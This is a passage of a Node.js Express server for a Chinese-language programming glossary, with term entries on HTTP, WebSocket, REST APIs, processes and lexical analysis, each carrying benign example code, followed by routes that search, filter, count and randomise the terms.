  });
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});`,
      useCases: ['Web通信', 'API设计', '数据传输', '客户端服务器交互'],
      relatedTerms: ['REST', 'status codes', 'headers', 'methods']
    },
    {
      id: 'net_2',
      name: 'websocket',
      chinese: 'WebSocket',
      description: '在客户端和服务器之间建立持久连接的通信协议，支持双向实时数据传输',
      difficulty: 'intermediate',
      tags: ['protocol', 'realtime', 'bidirectional'],
      example: `// 客户端WebSocket
const socket = new WebSocket('ws://localhost:8080');

socket.onopen = function(event) {
    console.log('Connected to WebSocket server');
    socket.send('Hello Server!');
};

socket.onmessage = function(event) {
    console.log('Message from server:', event.data);
};

socket.onclose = function(event) {
    console.log('Connection closed');
};

socket.onerror = function(error) {
    console.error('WebSocket error:', error);
};

// Node.js WebSocket服务器
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', function connection(ws) {
    console.log('New client connected');

    ws.on('message', function incoming(message) {
        console.log('Received:', message);

        // 广播给所有客户端
        wss.clients.forEach(function each(client) {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });
    });

    ws.on('close', function() {
        console.log('Client disconnected');
    });
});`,
      useCases: ['实时聊天', '在线游戏', '实时数据更新', '协作应用'],
      relatedTerms: ['real-time', 'bidirectional', 'persistent connection', 'socket.io']
    },
    {
      id: 'net_3',
      name: 'rest_api',
      chinese: 'REST API',
      description: '基于HTTP协议的架构风格，使用标准HTTP方法进行资源操作的API设计',
      difficulty: 'intermediate',
      tags: ['api', 'rest', 'http'],
      example: `// Express.js REST API实现
const express = require('express');
const app = express();

app.use(express.json());

// 模拟数据库
let users = [
    { id: 1, name: 'Alice', email: 'alice@example.com' },
    { id: 2, name: 'Bob', email: 'bob@example.com' }
];

// GET /users - 获取所有用户
app.get('/users', (req, res) => {
    res.json({
        success: true,
        data: users,
        total: users.length
    });
});

// GET /users/:id - 获取特定用户
app.get('/users/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const user = users.find(u => u.id === id);

    if (!user) {
        return res.status(404).json({
            success: false,
            error: 'User not found'
        });
    }

    res.json({
        success: true,
        data: user
    });
});

// POST /users - 创建新用户
app.post('/users', (req, res) => {
    const { name, email } = req.body;

    if (!name || !email) {
        return res.status(400).json({
            success: false,
            error: 'Name and email are required'
        });
    }

    const newUser = {
        id: users.length + 1,
        name,
        email
    };

    users.push(newUser);

    res.status(201).json({
        success: true,
        data: newUser
    });
});

// PUT /users/:id - 更新用户
app.put('/users/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const userIndex = users.findIndex(u => u.id === id);

    if (userIndex === -1) {
        return res.status(404).json({
            success: false,
            error: 'User not found'
        });
    }

    const { name, email } = req.body;
    users[userIndex] = { ...users[userIndex], name, email };

    res.json({
        success: true,
        data: users[userIndex]
    });
});

// DELETE /users/:id - 删除用户
app.delete('/users/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const userIndex = users.findIndex(u => u.id === id);

    if (userIndex === -1) {
        return res.status(404).json({
            success: false,
            error: 'User not found'
        });
    }

    users.splice(userIndex, 1);

    res.status(204).send();
});

// 客户端调用示例
class UserAPI {
    constructor(baseURL) {
        this.baseURL = baseURL;
    }

    async getUsers() {
        const response = await fetch(\`\${this.baseURL}/users\`);
        return response.json();
    }

    async getUser(id) {
        const response = await fetch(\`\${this.baseURL}/users/\${id}\`);
        if (!response.ok) {
            throw new Error('User not found');
        }
        return response.json();
    }

    async createUser(userData) {
        const response = await fetch(\`\${this.baseURL}/users\`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        return response.json();
    }

    async updateUser(id, userData) {
        const response = await fetch(\`\${this.baseURL}/users/\${id}\`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        return response.json();
    }

    async deleteUser(id) {
        const response = await fetch(\`\${this.baseURL}/users/\${id}\`, {
            method: 'DELETE'
        });
        return response.ok;
    }
}

// 使用API客户端
const api = new UserAPI('http://localhost:3000');

async function example() {
    try {
        // 获取所有用户
        const users = await api.getUsers();
        console.log('Users:', users);

        // 创建新用户
        const newUser = await api.createUser({
            name: 'Charlie',
            email: 'charlie@example.com'
        });
        console.log('Created user:', newUser);

        // 更新用户
        const updatedUser = await api.updateUser(1, {
            name: 'Alice Smith',
            email: 'alice.smith@example.com'
        });
        console.log('Updated user:', updatedUser);

    } catch (error) {
        console.error('API Error:', error);
    }
}`,
      useCases: ['Web API', '微服务', '移动应用后端', '第三方集成'],
      relatedTerms: ['http methods', 'stateless', 'json', 'crud operations']
    }
  ],

  // 操作系统 (15个术语)
  operatingsystems: [
    {
      id: 'os_1',
      name: 'process',
      chinese: '进程',
      description: '操作系统中正在执行的程序实例，拥有独立的内存空间和系统资源',
      difficulty: 'intermediate',
      tags: ['os', 'execution', 'memory'],
      example: `// Node.js进程管理
const { spawn, exec, fork } = require('child_process');

// 创建子进程
const child = spawn('ls', ['-la']);

child.stdout.on('data', (data) => {
    console.log(\`stdout: \${data}\`);
});

child.stderr.on('data', (data) => {
    console.error(\`stderr: \${data}\`);
});

child.on('close', (code) => {
    console.log(\`child process exited with code \${code}\`);
});

// 执行shell命令
exec('echo "Hello World"', (error, stdout, stderr) => {
    if (error) {
        console.error(\`exec error: \${error}\`);
        return;
    }
    console.log(\`stdout: \${stdout}\`);
});

// 进程信息
console.log('Process ID:', process.pid);
console.log('Parent Process ID:', process.ppid);
console.log('Platform:', process.platform);
console.log('Node Version:', process.version);

// 进程退出处理
process.on('exit', (code) => {
    console.log(\`Process exiting with code: \${code}\`);
});

process.on('SIGINT', () => {
    console.log('Received SIGINT, graceful shutdown...');
    process.exit(0);
});`,
      useCases: ['程序执行', '资源管理', '并发处理', '系统调用'],
      relatedTerms: ['thread', 'memory', 'scheduling', 'context switching']
    }
  ],

  // 编译原理 (12个术语)
  compilers: [
    {
      id: 'comp_1',
      name: 'lexical_analysis',
      chinese: '词法分析',
      description: '编译器前端的第一阶段，将源代码字符流转换为标记(token)序列',
      difficulty: 'advanced',
      tags: ['compiler', 'parsing', 'tokens'],
      example: `// 简单的词法分析器
class Lexer {
    constructor(input) {
        this.input = input;
        this.position = 0;
        this.currentChar = this.input[this.position];
    }

    error() {
        throw new Error('Invalid character');
    }

    advance() {
        this.position++;
        if (this.position >= this.input.length) {
            this.currentChar = null;
        } else {
            this.currentChar = this.input[this.position];
        }
    }

    skipWhitespace() {
        while (this.currentChar && /\\s/.test(this.currentChar)) {
            this.advance();
        }
    }

    number() {
        let result = '';
        while (this.currentChar && /\\d/.test(this.currentChar)) {
            result += this.currentChar;
            this.advance();
        }
        return parseInt(result);
    }

    getNextToken() {
        while (this.currentChar) {
            if (/\\s/.test(this.currentChar)) {
                this.skipWhitespace();
                continue;
            }

            if (/\\d/.test(this.currentChar)) {
                return { type: 'NUMBER', value: this.number() };
            }

            if (this.currentChar === '+') {
                this.advance();
                return { type: 'PLUS', value: '+' };
            }

            if (this.currentChar === '-') {
                this.advance();
                return { type: 'MINUS', value: '-' };
            }

            this.error();
        }

        return { type: 'EOF', value: null };
    }
}

// 使用示例
const lexer = new Lexer('3 + 5 - 2');
let token = lexer.getNextToken();
while (token.type !== 'EOF') {
    console.log(token);
    token = lexer.getNextToken();
}`,
      useCases: ['编译器构建', '语言处理', '代码分析', '语法高亮'],
      relatedTerms: ['tokens', 'parsing', 'syntax analysis', 'finite automata']
    }
  ]
};

// 将所有术语合并为一个数组
const allTerms = Object.values(programmingTermsDatabase).flat();

// API路由

// 获取所有术语
app.get('/api/terms', (req, res) => {
  const { category, difficulty, search, limit = 50, offset = 0 } = req.query;
  
  let filteredTerms = [...allTerms];
  
  // 分类过滤
  if (category && category !== 'all') {
    const categoryTerms = programmingTermsDatabase[category] || [];
    filteredTerms = categoryTerms;
  }
  
  // 难度过滤
  if (difficulty && difficulty !== 'all') {
    filteredTerms = filteredTerms.filter(term => term.difficulty === difficulty);
  }
  
  // 搜索过滤
  if (search) {
    const searchLower = search.toLowerCase();
    filteredTerms = filteredTerms.filter(term =>
      term.name.toLowerCase().includes(searchLower) ||
      term.chinese.includes(search) ||
      term.description.toLowerCase().includes(searchLower) ||
      term.tags.some(tag => tag.toLowerCase().includes(searchLower))
    );
  }
  
  // 分页
  const startIndex = parseInt(offset);
  const endIndex = startIndex + parseInt(limit);
  const paginatedTerms = filteredTerms.slice(startIndex, endIndex);
  
  res.json({
    terms: paginatedTerms,
    total: filteredTerms.length,
    hasMore: endIndex < filteredTerms.length,
    categories: Object.keys(programmingTermsDatabase),
    difficulties: ['beginner', 'intermediate', 'advanced']
  });
});

// 获取单个术语详情
app.get('/api/terms/:id', (req, res) => {
  const term = allTerms.find(t => t.id === req.params.id);
  if (!term) {
    return res.status(404).json({ error: 'Term not found' });
  }
  
  // 查找相关术语
  const relatedTerms = allTerms.filter(t => 
    t.id !== term.id && 
    (t.tags.some(tag => term.tags.includes(tag)) ||
     term.relatedTerms?.some(related => t.name.includes(related)))
  ).slice(0, 5);
  
  res.json({
    ...term,
    relatedTerms: relatedTerms.map(t => ({
      id: t.id,
      name: t.name,
      chinese: t.chinese
    }))
  });
});

// 获取分类列表
app.get('/api/categories', (req, res) => {
  const categories = Object.keys(programmingTermsDatabase).map(key => ({
    id: key,
    name: key,
    count: programmingTermsDatabase[key].length,
    displayName: {
      javascript: 'JavaScript核心',
      react: 'React生态',
      nodejs: 'Node.js后端',
      database: '数据库技术',
      css: 'CSS样式',
      algorithms: '算法数据结构',
      security: 'Web安全',
      emerging: '新兴技术',
      devtools: '开发工具',
      testing: '测试质量',
      typescript: 'TypeScript',
      performance: '性能优化',
      python: 'Python编程',
      mobile: '移动开发',
      cloud: '云计算',
      devops: 'DevOps部署',
      datascience: '数据科学',
      java: 'Java编程',
      blockchain: '区块链',
      gamedev: '游戏开发',
      cybersecurity: '网络安全',
      fundamentals: '编程基础',
      datastructures: '数据结构',
      softwareengineering: '软件工程',
      networking: '网络编程',
      operatingsystems: '操作系统',
      compilers: '编译原理',
      html: 'HTML基础'
    }[key] || key
  }));
  
  res.json(categories);
});

// 获取统计信息
app.get('/api/stats', (req, res) => {
  const stats = {
    totalTerms: allTerms.length,
    categories: Object.keys(programmingTermsDatabase).length,
    byDifficulty: {
      beginner: allTerms.filter(t => t.difficulty === 'beginner').length,
      intermediate: allTerms.filter(t => t.difficulty === 'intermediate').length,
      advanced: allTerms.filter(t => t.difficulty === 'advanced').length
    },
    byCategory: Object.keys(programmingTermsDatabase).reduce((acc, key) => {
      acc[key] = programmingTermsDatabase[key].length;
      return acc;
    }, {}),
    lastUpdated: new Date().toISOString()
  };
  
  res.json(stats);
});

// 随机获取术语
app.get('/api/random', (req, res) => {
  const { count = 1 } = req.query;
  const shuffled = [...allTerms].sort(() => 0.5 - Math.random());
  const randomTerms = shuffled.slice(0, parseInt(count));
  
  res.json(randomTerms);
});

// 主页路由
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 404处理
app.use('*', (req, res) => {
  if (req.url.startsWith('/api/')) {
    res.status(404).json({ error: 'API endpoint not found' });
  } else {
    res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
  }
});

// 全局错误处理
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// 优雅关闭
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});

// 启动服务器
app.listen(PORT, () => {
  console.log(`
  🚀 终极编程术语词典服务器启动成功!
  
  📍 本地访问: http://localhost:${PORT}
  📊 API文档: http://localhost:${PORT}/api/stats
  📚 术语总数: ${allTerms.length}
  🏷️  分类数量: ${Object.keys(programmingTermsDatabase).length}
  
  💡 API端点:
     GET /api/terms - 获取术语列表
     GET /api/terms/:id - 获取术语详情
     GET /api/categories - 获取分类
     GET /api/stats - 获取统计信息
     GET /api/random - 随机术语
  
  🔥 开始探索编程世界吧!
  `);
});